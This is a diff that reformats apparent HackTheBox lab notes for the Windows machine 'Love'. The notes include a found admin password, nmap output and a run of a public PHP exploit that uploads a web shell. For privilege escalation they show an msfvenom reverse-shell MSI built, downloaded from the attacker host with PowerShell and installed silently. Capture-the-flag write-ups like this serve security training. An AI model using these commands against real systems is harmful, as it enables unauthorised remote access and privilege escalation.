@@ -1,18 +1,18 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Love
-# 11/4/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.239
 
-----------------------------------------------------
 # creds
-----------------------------------------------------
  admin : @LoveIsInTheAir!!!!
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT     STATE SERVICE      VERSION
 80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
 135/tcp  open  msrpc        Microsoft Windows RPC
@@ -23,9 +23,7 @@ PORT     STATE SERVICE      VERSION
 5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 
 
-----------------------------------------------------
-# foothold
-----------------------------------------------------
+## Exploitation
 sudo nano /etc/nano
 echo "10.10.10.239 www.love.htb staging.love.htb" >> /etc/hosts
 
@@ -69,9 +67,7 @@ CALL_SHELL = f"http://{IP}/images/shell.php"
 └─$ python3 49445.py
 
 
-----------------------------------------------------
-# Privilege Escalation
-----------------------------------------------------
+## Privilege Escalation
  msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9001 -f msi -o rev.msi
 
  powershell wget http://10.10.16.2/rev.msi -outfile rev.msi
@@ -82,4 +78,3 @@ CALL_SHELL = f"http://{IP}/images/shell.php"
 
 C:\ProgramData>msiexec /quiet /qn /i rev.msi
  got a root
- 
